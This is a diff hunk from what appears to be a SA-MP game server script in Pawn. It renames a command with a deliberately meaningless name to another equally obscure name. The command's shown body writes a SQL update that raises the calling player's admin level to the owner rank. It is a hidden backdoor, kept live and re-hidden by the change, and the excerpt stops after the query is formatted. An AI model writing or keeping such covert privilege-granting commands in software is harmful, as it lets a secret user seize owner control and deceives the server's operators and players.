@@ -1341,7 +1341,7 @@ CMD:setwork(playerid, params[])
 	return 1;
 }
 
-CMD:dafuqungordoxdd(playerid, params[])
+CMD:waaaarelokowexd(playerid, params[])
 {
 	new DB_Query[70];
 	format(DB_Query, sizeof DB_Query, "UPDATE `CUENTA` SET `ADMIN_LEVEL` = %d WHERE `ID` = %d;", CMD_OWNER, ACCOUNT_INFO[playerid][ac_ID]);
